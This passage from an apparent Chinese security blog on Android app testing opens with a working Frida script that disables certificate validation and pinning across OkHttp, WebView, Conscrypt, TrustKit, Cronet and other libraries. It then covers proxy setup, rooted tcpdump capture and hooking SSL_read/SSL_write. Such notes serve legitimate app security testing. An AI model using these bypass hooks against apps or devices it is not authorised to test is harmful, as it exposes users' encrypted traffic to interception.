EmptySSLFactory &#x3D; TLS_SSLContext.getSocketFactory();</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            quiet_send(e.message);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        send(&#39;Custom, Empty TrustManager ready&#39;);</span><br><span class="line">    </span><br><span class="line">        &#x2F;&#x2F; Get a handle on the init() on the SSLContext class</span><br><span class="line">        var SSLContext_init &#x3D; SSLContext.init.overload(</span><br><span class="line">            &#39;[Ljavax.net.ssl.KeyManager;&#39;, &#39;[Ljavax.net.ssl.TrustManager;&#39;, &#39;java.security.SecureRandom&#39;);</span><br><span class="line">    </span><br><span class="line">        &#x2F;&#x2F; Override the init method, specifying our new TrustManager</span><br><span class="line">        SSLContext_init.implementation &#x3D; function(keyManager, trustManager, secureRandom) &#123;</span><br><span class="line">    </span><br><span class="line">            quiet_send(&#39;Overriding SSLContext.init() with the custom TrustManager&#39;);</span><br><span class="line">    </span><br><span class="line">            SSLContext_init.call(this, null, TrustManagers, null);</span><br><span class="line">        &#125;;</span><br><span class="line">    </span><br><span class="line">        &#x2F;*** okhttp3.x unpinning ***&#x2F;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        &#x2F;&#x2F; Wrap the logic in a try&#x2F;catch as not all applications will have</span><br><span class="line">        &#x2F;&#x2F; okhttp as part of the app.</span><br><span class="line">        try &#123;</span><br><span class="line">    </span><br><span class="line">            var CertificatePinner &#x3D; Java.use(&#39;okhttp3.CertificatePinner&#39;);</span><br><span class="line">    </span><br><span class="line">            quiet_send(&#39;OkHTTP 3.x Found&#39;);</span><br><span class="line">    </span><br><span class="line">            CertificatePinner.check.overload(&#39;java.lang.String&#39;, &#39;java.util.List&#39;).implementation &#x3D; function() &#123;</span><br><span class="line">    </span><br><span class="line">                quiet_send(&#39;OkHTTP 3.x check() called. Not throwing an exception.&#39;);</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">        &#125; catch (err) &#123;</span><br><span class="line">    </span><br><span class="line">            &#x2F;&#x2F; If we dont have a ClassNotFoundException exception, raise the</span><br><span class="line">            &#x2F;&#x2F; problem encountered.</span><br><span class="line">            if (err.message.indexOf(&#39;ClassNotFoundException&#39;) &#x3D;&#x3D;&#x3D; 0) &#123;</span><br><span class="line">    </span><br><span class="line">                throw new Error(err);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        &#x2F;&#x2F; Appcelerator Titanium PinningTrustManager</span><br><span class="line">    </span><br><span class="line">        &#x2F;&#x2F; Wrap the logic in a try&#x2F;catch as not all applications will have</span><br><span class="line">        &#x2F;&#x2F; appcelerator as part of the app.</span><br><span class="line">        try &#123;</span><br><span class="line">    </span><br><span class="line">            var PinningTrustManager &#x3D; Java.use(&#39;appcelerator.https.PinningTrustManager&#39;);</span><br><span class="line">    </span><br><span class="line">            send(&#39;Appcelerator Titanium Found&#39;);</span><br><span class="line">    </span><br><span class="line">            PinningTrustManager.checkServerTrusted.implementation &#x3D; function() &#123;</span><br><span class="line">    </span><br><span class="line">                quiet_send(&#39;Appcelerator checkServerTrusted() called. Not throwing an exception.&#39;);</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">        &#125; catch (err) &#123;</span><br><span class="line">    </span><br><span class="line">            &#x2F;&#x2F; If we dont have a ClassNotFoundException exception, raise the</span><br><span class="line">            &#x2F;&#x2F; problem encountered.</span><br><span class="line">            if (err.message.indexOf(&#39;ClassNotFoundException&#39;) &#x3D;&#x3D;&#x3D; 0) &#123;</span><br><span class="line">    </span><br><span class="line">                throw new Error(err);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        &#x2F;*** okhttp unpinning ***&#x2F;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        try &#123;</span><br><span class="line">            var OkHttpClient &#x3D; Java.use(&quot;com.squareup.okhttp.OkHttpClient&quot;);</span><br><span class="line">            OkHttpClient.setCertificatePinner.implementation &#x3D; function(certificatePinner) &#123;</span><br><span class="line">                &#x2F;&#x2F; do nothing</span><br><span class="line">                quiet_send(&quot;OkHttpClient.setCertificatePinner Called!&quot;);</span><br><span class="line">                return this;</span><br><span class="line">            &#125;;</span><br><span class="line">    </span><br><span class="line">            &#x2F;&#x2F; Invalidate the certificate pinnet checks (if &quot;setCertificatePinner&quot; was called before the previous invalidation)</span><br><span class="line">            var CertificatePinner &#x3D; Java.use(&quot;com.squareup.okhttp.CertificatePinner&quot;);</span><br><span class="line">            CertificatePinner.check.overload(&#39;java.lang.String&#39;, &#39;[Ljava.security.cert.Certificate;&#39;).implementation &#x3D; function(p0, p1) &#123;</span><br><span class="line">                &#x2F;&#x2F; do nothing</span><br><span class="line">                quiet_send(&quot;okhttp Called! [Certificate]&quot;);</span><br><span class="line">                return;</span><br><span class="line">            &#125;;</span><br><span class="line">            CertificatePinner.check.overload(&#39;java.lang.String&#39;, &#39;java.util.List&#39;).implementation &#x3D; function(p0, p1) &#123;</span><br><span class="line">                &#x2F;&#x2F; do nothing</span><br><span class="line">                quiet_send(&quot;okhttp Called! [List]&quot;);</span><br><span class="line">                return;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            quiet_send(&quot;com.squareup.okhttp not found&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        &#x2F;*** WebView Hooks ***&#x2F;</span><br><span class="line">    </span><br><span class="line">        &#x2F;* frameworks&#x2F;base&#x2F;core&#x2F;java&#x2F;android&#x2F;webkit&#x2F;WebViewClient.java *&#x2F;</span><br><span class="line">        &#x2F;* public void onReceivedSslError(Webview, SslErrorHandler, SslError) *&#x2F;</span><br><span class="line">        var WebViewClient &#x3D; Java.use(&quot;android.webkit.WebViewClient&quot;);</span><br><span class="line">    </span><br><span class="line">        WebViewClient.onReceivedSslError.implementation &#x3D; function(webView, sslErrorHandler, sslError) &#123;</span><br><span class="line">            quiet_send(&quot;WebViewClient onReceivedSslError invoke&quot;);</span><br><span class="line">            &#x2F;&#x2F;执行proceed方法</span><br><span class="line">            sslErrorHandler.proceed();</span><br><span class="line">            return;</span><br><span class="line">        &#125;;</span><br><span class="line">    </span><br><span class="line">        WebViewClient.onReceivedError.overload(&#39;android.webkit.WebView&#39;, &#39;int&#39;, &#39;java.lang.String&#39;, &#39;java.lang.String&#39;).implementation &#x3D; function(a, b, c, d) &#123;</span><br><span class="line">            quiet_send(&quot;WebViewClient onReceivedError invoked&quot;);</span><br><span class="line">            return;</span><br><span class="line">        &#125;;</span><br><span class="line">    </span><br><span class="line">        WebViewClient.onReceivedError.overload(&#39;android.webkit.WebView&#39;, &#39;android.webkit.WebResourceRequest&#39;, &#39;android.webkit.WebResourceError&#39;).implementation &#x3D; function() &#123;</span><br><span class="line">            quiet_send(&quot;WebViewClient onReceivedError invoked&quot;);</span><br><span class="line">            return;</span><br><span class="line">        &#125;;</span><br><span class="line">    </span><br><span class="line">        &#x2F;*** JSSE Hooks ***&#x2F;</span><br><span class="line">    </span><br><span class="line">        &#x2F;* libcore&#x2F;luni&#x2F;src&#x2F;main&#x2F;java&#x2F;javax&#x2F;net&#x2F;ssl&#x2F;TrustManagerFactory.java *&#x2F;</span><br><span class="line">        &#x2F;* public final TrustManager[] getTrustManager() *&#x2F;</span><br><span class="line">        &#x2F;* TrustManagerFactory.getTrustManagers maybe cause X509TrustManagerExtensions error  *&#x2F;</span><br><span class="line">        &#x2F;&#x2F; var TrustManagerFactory &#x3D; Java.use(&quot;javax.net.ssl.TrustManagerFactory&quot;);</span><br><span class="line">        &#x2F;&#x2F; TrustManagerFactory.getTrustManagers.implementation &#x3D; function()&#123;</span><br><span class="line">        &#x2F;&#x2F;     quiet_send(&quot;TrustManagerFactory getTrustManagers invoked&quot;);</span><br><span class="line">        &#x2F;&#x2F;     return TrustManagers;</span><br><span class="line">        &#x2F;&#x2F; &#125;</span><br><span class="line">    </span><br><span class="line">        var HttpsURLConnection &#x3D; Java.use(&quot;javax.net.ssl.HttpsURLConnection&quot;);</span><br><span class="line">        &#x2F;* libcore&#x2F;luni&#x2F;src&#x2F;main&#x2F;java&#x2F;javax&#x2F;net&#x2F;ssl&#x2F;HttpsURLConnection.java *&#x2F;</span><br><span class="line">        &#x2F;* public void setDefaultHostnameVerifier(HostnameVerifier) *&#x2F;</span><br><span class="line">        HttpsURLConnection.setDefaultHostnameVerifier.implementation &#x3D; function(hostnameVerifier) &#123;</span><br><span class="line">            quiet_send(&quot;HttpsURLConnection.setDefaultHostnameVerifier invoked&quot;);</span><br><span class="line">            return null;</span><br><span class="line">        &#125;;</span><br><span class="line">        &#x2F;* libcore&#x2F;luni&#x2F;src&#x2F;main&#x2F;java&#x2F;javax&#x2F;net&#x2F;ssl&#x2F;HttpsURLConnection.java *&#x2F;</span><br><span class="line">        &#x2F;* public void setSSLSocketFactory(SSLSocketFactory) *&#x2F;</span><br><span class="line">        HttpsURLConnection.setSSLSocketFactory.implementation &#x3D; function(SSLSocketFactory) &#123;</span><br><span class="line">            quiet_send(&quot;HttpsURLConnection.setSSLSocketFactory invoked&quot;);</span><br><span class="line">            return null;</span><br><span class="line">        &#125;;</span><br><span class="line">        &#x2F;* libcore&#x2F;luni&#x2F;src&#x2F;main&#x2F;java&#x2F;javax&#x2F;net&#x2F;ssl&#x2F;HttpsURLConnection.java *&#x2F;</span><br><span class="line">        &#x2F;* public void setHostnameVerifier(HostnameVerifier) *&#x2F;</span><br><span class="line">        HttpsURLConnection.setHostnameVerifier.implementation &#x3D; function(hostnameVerifier) &#123;</span><br><span class="line">            quiet_send(&quot;HttpsURLConnection.setHostnameVerifier invoked&quot;);</span><br><span class="line">            return null;</span><br><span class="line">        &#125;;</span><br><span class="line">    </span><br><span class="line">        &#x2F;*** Xutils3.x hooks ***&#x2F;</span><br><span class="line">        &#x2F;&#x2F;Implement a new HostnameVerifier</span><br><span class="line">        var TrustHostnameVerifier;</span><br><span class="line">        try &#123;</span><br><span class="line">            TrustHostnameVerifier &#x3D; Java.registerClass(&#123;</span><br><span class="line">                name: &#39;org.wooyun.TrustHostnameVerifier&#39;,</span><br><span class="line">                implements: [HostnameVerifier],</span><br><span class="line">                method: &#123;</span><br><span class="line">                    verify: function(hostname, session) &#123;</span><br><span class="line">                        return true;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">    </span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            &#x2F;&#x2F;java.lang.ClassNotFoundException: Didn&#39;t find class &quot;org.wooyun.TrustHostnameVerifier&quot;</span><br><span class="line">            quiet_send(&quot;registerClass from hostnameVerifier &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; &quot; + e.message);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        try &#123;</span><br><span class="line">            var RequestParams &#x3D; Java.use(&#39;org.xutils.http.RequestParams&#39;);</span><br><span class="line">            RequestParams.setSslSocketFactory.implementation &#x3D; function(sslSocketFactory) &#123;</span><br><span class="line">                sslSocketFactory &#x3D; EmptySSLFactory;</span><br><span class="line">                return null;</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">            RequestParams.setHostnameVerifier.implementation &#x3D; function(hostnameVerifier) &#123;</span><br><span class="line">                hostnameVerifier &#x3D; TrustHostnameVerifier.$new();</span><br><span class="line">                return null;</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            quiet_send(&quot;Xutils hooks not Found&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        &#x2F;*** httpclientandroidlib Hooks ***&#x2F;</span><br><span class="line">        try &#123;</span><br><span class="line">            var AbstractVerifier &#x3D; Java.use(&quot;ch.boye.httpclientandroidlib.conn.ssl.AbstractVerifier&quot;);</span><br><span class="line">            AbstractVerifier.verify.overload(&#39;java.lang.String&#39;, &#39;[Ljava.lang.String&#39;, &#39;[Ljava.lang.String&#39;, &#39;boolean&#39;).implementation &#x3D; function() &#123;</span><br><span class="line">                quiet_send(&quot;httpclientandroidlib Hooks&quot;);</span><br><span class="line">                return null;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            quiet_send(&quot;httpclientandroidlib Hooks not found&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        &#x2F;***</span><br><span class="line">    android 7.0+ network_security_config TrustManagerImpl hook</span><br><span class="line">    apache httpclient partly</span><br><span class="line">    ***&#x2F;</span><br><span class="line">        var TrustManagerImpl &#x3D; Java.use(&quot;com.android.org.conscrypt.TrustManagerImpl&quot;);</span><br><span class="line">        &#x2F;&#x2F; try &#123;</span><br><span class="line">        &#x2F;&#x2F;     var Arrays &#x3D; Java.use(&quot;java.util.Arrays&quot;);</span><br><span class="line">        &#x2F;&#x2F;     &#x2F;&#x2F;apache http client pinning maybe baypass</span><br><span class="line">        &#x2F;&#x2F;     &#x2F;&#x2F;https:&#x2F;&#x2F;github.com&#x2F;google&#x2F;conscrypt&#x2F;blob&#x2F;c88f9f55a523f128f0e4dace76a34724bfa1e88c&#x2F;platform&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;conscrypt&#x2F;TrustManagerImpl.java#471</span><br><span class="line">        &#x2F;&#x2F;     TrustManagerImpl.checkTrusted.implementation &#x3D; function (chain, authType, session, parameters, authType) &#123;</span><br><span class="line">        &#x2F;&#x2F;         quiet_send(&quot;TrustManagerImpl checkTrusted called&quot;);</span><br><span class="line">        &#x2F;&#x2F;         &#x2F;&#x2F;Generics currently result in java.lang.Object</span><br><span class="line">        &#x2F;&#x2F;         return Arrays.asList(chain);</span><br><span class="line">        &#x2F;&#x2F;     &#125;</span><br><span class="line">        &#x2F;&#x2F;</span><br><span class="line">        &#x2F;&#x2F; &#125; catch (e) &#123;</span><br><span class="line">        &#x2F;&#x2F;     quiet_send(&quot;TrustManagerImpl checkTrusted nout found&quot;);</span><br><span class="line">        &#x2F;&#x2F; &#125;</span><br><span class="line">    </span><br><span class="line">        try &#123;</span><br><span class="line">            &#x2F;&#x2F; Android 7+ TrustManagerImpl</span><br><span class="line">            TrustManagerImpl.verifyChain.implementation &#x3D; function(untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) &#123;</span><br><span class="line">                quiet_send(&quot;TrustManagerImpl verifyChain called&quot;);</span><br><span class="line">                &#x2F;&#x2F; Skip all the logic and just return the chain again :P</span><br><span class="line">                &#x2F;&#x2F;https:&#x2F;&#x2F;www.nccgroup.trust&#x2F;uk&#x2F;about-us&#x2F;newsroom-and-events&#x2F;blogs&#x2F;2017&#x2F;november&#x2F;bypassing-androids-network-security-configuration&#x2F;</span><br><span class="line">                &#x2F;&#x2F; https:&#x2F;&#x2F;github.com&#x2F;google&#x2F;conscrypt&#x2F;blob&#x2F;c88f9f55a523f128f0e4dace76a34724bfa1e88c&#x2F;platform&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;conscrypt&#x2F;TrustManagerImpl.java#L650</span><br><span class="line">                return untrustedChain;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            quiet_send(&quot;TrustManagerImpl verifyChain nout found below 7.0&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F; OpenSSLSocketImpl</span><br><span class="line">        try &#123;</span><br><span class="line">            var OpenSSLSocketImpl &#x3D; Java.use(&#39;com.android.org.conscrypt.OpenSSLSocketImpl&#39;);</span><br><span class="line">            OpenSSLSocketImpl.verifyCertificateChain.implementation &#x3D; function(certRefs, authMethod) &#123;</span><br><span class="line">                quiet_send(&#39;OpenSSLSocketImpl.verifyCertificateChain&#39;);</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">            quiet_send(&#39;OpenSSLSocketImpl pinning&#39;)</span><br><span class="line">        &#125; catch (err) &#123;</span><br><span class="line">            quiet_send(&#39;OpenSSLSocketImpl pinner not found&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F; Trustkit</span><br><span class="line">        try &#123;</span><br><span class="line">            var Activity &#x3D; Java.use(&quot;com.datatheorem.android.trustkit.pinning.OkHostnameVerifier&quot;);</span><br><span class="line">            Activity.verify.overload(&#39;java.lang.String&#39;, &#39;javax.net.ssl.SSLSession&#39;).implementation &#x3D; function(str) &#123;</span><br><span class="line">                quiet_send(&#39;Trustkit.verify1: &#39; + str);</span><br><span class="line">                return true;</span><br><span class="line">            &#125;;</span><br><span class="line">            Activity.verify.overload(&#39;java.lang.String&#39;, &#39;java.security.cert.X509Certificate&#39;).implementation &#x3D; function(str) &#123;</span><br><span class="line">                quiet_send(&#39;Trustkit.verify2: &#39; + str);</span><br><span class="line">                return true;</span><br><span class="line">            &#125;;</span><br><span class="line">    </span><br><span class="line">            quiet_send(&#39;Trustkit pinning&#39;)</span><br><span class="line">        &#125; catch (err) &#123;</span><br><span class="line">            quiet_send(&#39;Trustkit pinner not found&#39;)</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        try &#123;</span><br><span class="line">            &#x2F;&#x2F;cronet pinner hook</span><br><span class="line">            &#x2F;&#x2F;weibo don&#39;t invoke</span><br><span class="line">    </span><br><span class="line">            var netBuilder &#x3D; Java.use(&quot;org.chromium.net.CronetEngine$Builder&quot;);</span><br><span class="line">    </span><br><span class="line">            &#x2F;&#x2F;https:&#x2F;&#x2F;developer.android.com&#x2F;guide&#x2F;topics&#x2F;connectivity&#x2F;cronet&#x2F;reference&#x2F;org&#x2F;chromium&#x2F;net&#x2F;CronetEngine.Builder.html#enablePublicKeyPinningBypassForLocalTrustAnchors(boolean)</span><br><span class="line">            netBuilder.enablePublicKeyPinningBypassForLocalTrustAnchors.implementation &#x3D; function(arg) &#123;</span><br><span class="line">    </span><br><span class="line">                &#x2F;&#x2F;weibo not invoke</span><br><span class="line">                console.log(&quot;Enables or disables public key pinning bypass for local trust anchors &#x3D; &quot; + arg);</span><br><span class="line">    </span><br><span class="line">                &#x2F;&#x2F;true to enable the bypass, false to disable.</span><br><span class="line">                var ret &#x3D; netBuilder.enablePublicKeyPinningBypassForLocalTrustAnchors.call(this, true);</span><br><span class="line">                return ret;</span><br><span class="line">            &#125;;</span><br><span class="line">    </span><br><span class="line">            netBuilder.addPublicKeyPins.implementation &#x3D; function(hostName, pinsSha256, includeSubdomains, expirationDate) &#123;</span><br><span class="line">                console.log(&quot;cronet addPublicKeyPins hostName &#x3D; &quot; + hostName);</span><br><span class="line">    </span><br><span class="line">                &#x2F;&#x2F;var ret &#x3D; netBuilder.addPublicKeyPins.call(this,hostName, pinsSha256,includeSubdomains, expirationDate);</span><br><span class="line">                &#x2F;&#x2F;this 是调用 addPublicKeyPins 前的对象吗? Yes,CronetEngine.Builder</span><br><span class="line">                return this;</span><br><span class="line">            &#125;;</span><br><span class="line">    </span><br><span class="line">        &#125; catch (err) &#123;</span><br><span class="line">            console.log(&#39;[-] Cronet pinner not found&#39;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><h2 id="流量不通过代理"><a href="#流量不通过代理" class="headerlink" title="流量不通过代理"></a>流量不通过代理</h2><h3 id="使用ProxyDroid或者Postern"><a href="#使用ProxyDroid或者Postern" class="headerlink" title="使用ProxyDroid或者Postern"></a>使用ProxyDroid或者Postern</h3><p>ProxyDroid上文已经介绍Postern配置如下</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211220170123027.png" alt="image-20211220170123027"></p><h3 id="使用Proxifier进行绕过"><a href="#使用Proxifier进行绕过" class="headerlink" title="使用Proxifier进行绕过"></a>使用Proxifier进行绕过</h3><p>此方法适用于被分析应用程序正常运行于模拟器中，整体思路如下：</p><p><code>安卓模拟器 网络进程 --Proxifier代理 --Burpsuite</code></p><p>在Proxifier中添加proxy</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211220182951560.png" alt="image-20211220182951560" style="zoom:50%;"><p>对于Mac下的MuMu的配置如下：</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211220183120353.png" alt="image-20211220183120353" style="zoom:50%;"><p>对于Mac下的夜神配置如下：</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211220191735429.png" alt="image-20211220191735429" style="zoom:50%;"><p>其他模拟器思路类似</p><h2 id="使用传输层协议"><a href="#使用传输层协议" class="headerlink" title="使用传输层协议"></a>使用传输层协议</h2><p>使用TCP或UDP</p><p>解决方法：WireShark </p><p>1). tcpdump 是⼀个运⾏在 Linux 平台的可执⾏ ELF ⽂件 <a href="https://www.androidtcpdump.com/android-tcpdump/downloads">https://www.androidtcpdump.com/android-tcpdump/downloads</a> 下载⼆进制⽂件 </p><p>2). 由于依赖adb，⾸先在 macOS 安装adb，命令如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ brew cask install android-platform-tools</span><br></pre></td></tr></table></figure><p>3).拥有设备root权限</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ adb push tcpdump &#x2F;data&#x2F;local&#x2F;tmp</span><br><span class="line"># adb shell</span><br><span class="line"># su</span><br><span class="line"># chmod 755 tcpdump</span><br><span class="line"># .&#x2F;tcpdump -i any -p -s 0 -w &#x2F;sdcard&#x2F;capture.pcap</span><br><span class="line">$ adb pull &#x2F;sdcard&#x2F;capture.pcap &#x2F;pcpath</span><br><span class="line">使⽤Wireshark打开 pcap⽂件</span><br><span class="line">$ wireshark &#x2F;pcpath&#x2F;capture.pcap</span><br></pre></td></tr></table></figure><h2 id="使用VPN"><a href="#使用VPN" class="headerlink" title="使用VPN"></a>使用VPN</h2><p>需要具体分析</p><h1 id="通信数据加解密-签名"><a href="#通信数据加解密-签名" class="headerlink" title="通信数据加解密/签名"></a>通信数据加解密/签名</h1><h2 id="Frida"><a href="#Frida" class="headerlink" title="Frida"></a>Frida</h2><h3 id="Httpdecrypt"><a href="#Httpdecrypt" class="headerlink" title="Httpdecrypt"></a>Httpdecrypt</h3><p><a href="https://www.ol4three.com/2020/12/29/Android/%E4%BD%BF%E7%94%A8Httpdecrypt%E8%BF%9B%E8%A1%8CHOOK/">httpdecrypt</a></p><h2 id="Hook"><a href="#Hook" class="headerlink" title="Hook"></a>Hook</h2><h3 id="Inspeckage"><a href="#Inspeckage" class="headerlink" title="Inspeckage"></a>Inspeckage</h3><p>在看源码等待更新</p><h2 id="Hook-HTTP-HTTPS"><a href="#Hook-HTTP-HTTPS" class="headerlink" title="Hook HTTP/HTTPS"></a>Hook HTTP/HTTPS</h2><h3 id="使用系统中SSL库"><a href="#使用系统中SSL库" class="headerlink" title="使用系统中SSL库"></a>使用系统中SSL库</h3><h4 id="xposed"><a href="#xposed" class="headerlink" title="xposed"></a>xposed</h4><h5 id="java"><a href="#java" class="headerlink" title="java"></a>java</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java.androidVersion &gt; 8</span><br><span class="line">ConscryptFileDescriptorSocket</span><br><span class="line">解释：</span><br><span class="line">基于OpenSSLSocketlmpl的实现</span><br><span class="line">路径：</span><br><span class="line">http:&#x2F;&#x2F;aosp.opersys.com&#x2F;xref&#x2F;android-10.0.0_r47&#x2F;xref&#x2F;external&#x2F;conscrypt&#x2F;repackaged&#x2F;common&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;android&#x2F;org&#x2F;conscrypt&#x2F;ConscryptFileDescriptorSocket.java#123</span><br><span class="line">理解：</span><br><span class="line">android中openssl的实现，存在数据加解密的读写接口</span><br><span class="line">com.android.org.conscrypt.ConscryptFileDescriptorScoket$SSLOutputStream.write(&#39;[B&#39;,&#39;int&#39;,&#39;int&#39;)</span><br><span class="line">com.android.org.conscrypt.ConscryptFileDescriptorScoket$SSLIntputStream.read(&#39;[B&#39;,&#39;int&#39;,&#39;int&#39;)</span><br></pre></td></tr></table></figure><p>​            </p><pre><code>java.androidVersion &lt;= 8    OpenSSLSocketlmpl        解释：            OpenSSL实现        路径：            http://aosp.opersys.com/xref/android-8.0.0_r51/xref/external/conscrypt/common/src/main/java/org/conscrypt/OpenSSLSocketImpl.java        理解：            android中openssl的实现，存在数据加解密的读写接口        com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLOutputStream.write(&apos;[B&apos;,&apos;int&apos;,&apos;int&apos;)        com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLInputStream.read(&apos;[B&apos;,&apos;int&apos;,&apos;int&apos;)</code></pre><h5 id="native"><a href="#native" class="headerlink" title="native"></a>native</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;system&#x2F;lib&#x2F;libssl.so库中的SSL_read()和SSL_write()</span><br><span class="line">说明：</span><br><span class="line">Java中的SSLOutputSteam.write()和SSLInputStream.read()实际上就是对libssl.so库的SSL_write()和SSL_read()包装调用</span><br></pre></td></tr></table></figure><h4 id="frida"><a href="#frida" class="headerlink" title="frida"></a>frida</h4><h5 id="java-1"><a href="#java-1" class="headerlink" title="java"></a>java</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java.use(&quot;com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLOutputStream&quot;).write.overload(&#39;[B&#39;,&#39;int&#39;,&#39;int&#39;).implementation</span><br><span class="line">java.use(&quot;com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLInputStream&quot;).read.overload(&#39;[B&#39;,&#39;int&#39;,&#39;int&#39;).implementation</span><br><span class="line">java.use(&quot;com.android.org.conscrypt.OpenSSLSocketImpl$SSLOutputStream&quot;).write.overload(&#39;[B&#39;，&#39;int&#39;,&#39;int&#39;).implementation</span><br><span class="line">java.use(&quot;com.android.org.conscrypt.OpenSSLSocketImpl$SSLInputStream&quot;).Read.overload(&#39;[B&#39;，&#39;int&#39;,&#39;int&#39;).implementation</span><br></pre></td></tr></table></figure><h5 id="native-1"><a href="#native-1" class="headerlink" title="native"></a>native</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Interceptor.attach(address[&#39;SSL_read&#39;])</span><br><span class="line">Interceptor.attach(address[&#39;SSL_write&#39;])</span><br></pre></td></tr></table></figure><h3 id="协议使用了自我集成的SSL类库"><a href="#协议使用了自我集成的SSL类库" class="headerlink" title="协议使用了自我集成的SSL类库"></a>协议使用了自我集成的SSL类库</h3><p>举出一些常用的例子</p><p>1.Chrome</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Android L &amp; M libchrome.so</span><br><span class="line">Android N, O &amp; P libmonochrome.so</span><br></pre></td></tr></table></figure><p>2.系统内置webview</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用(pm path com.google.android.webview)得到webview的路径</span><br></pre></td></tr></table></figure><p>3.浏览器APP的webviewer</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OPPO</span><br><span class="line">libheytapwebview.so</span><br><span class="line">华为</span><br><span class="line">libhwwebviewchromium.so</span><br><span class="line">小米</span><br><span class="line">libmiui_chromium.so</span><br><span class="line">vivo</span><br><span class="line">libwebviewchromium_vivo.so</span><br></pre></td></tr></table></figure><p>4.基于Chromium的第三方浏览器内核</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">腾讯系的APP</span><br><span class="line">libmttwebview.so x5内核</span><br><span class="line">阿里系的APP</span><br><span class="line">libwebviewuc.so UC的U4内核</span><br><span class="line">各种小程序</span><br><span class="line">libxwalkcore.so CrossWalk内核</span><br></pre></td></tr></table></figure><p>5.微信(使用多内核的APP)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">有些APP回使用多个内核，以微信为例，同时使用了X5和CrossWalk内核</span><br><span class="line">x5</span><br><span class="line">com.tencent.mm.tools进程</span><br><span class="line">聊天界面点开的webview、支付里的页面(长按下啦提示使用x5内核的都可以)</span><br><span class="line">CrossWalk</span><br><span class="line">长按下拉未提示x5</span><br><span class="line">com.tencent.mm:toolsmp进程</span><br><span class="line">公众号文章、搜一搜</span><br><span class="line">com.tencent.mm:appbrand进程</span><br><span class="line">小程序</span><br></pre></td></tr></table></figure><h4 id="native-2"><a href="#native-2" class="headerlink" title="native"></a>native</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.对于native库，写脚本定位APP自带的SSL_read和SSL_write的偏移量，工程性质问题</span><br><span class="line">https:&#x2F;&#x2F;mabin004.github.io&#x2F;2020&#x2F;07&#x2F;24&#x2F;自动定位webview中的SLL-read和SSL-write&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;nytrosecurity.com&#x2F;2018&#x2F;02&#x2F;26&#x2F;hooking-chromes-ssl-functions&#x2F;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;平常在进行APP测试的时候发现存在了很多问题，现在总结记录一下对应的知识，都在这遍文章下记录更新，老规矩先放一张图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211206111758936.png&quot; alt=&quot;image-20211206111758936&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Android" scheme="http://www.ol4three.com/categories/Android/"/>
    
    
      <category term="APP测试" scheme="http://www.ol4three.com/tags/APP%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>CobaltSrike二次开发之流量修改</title>
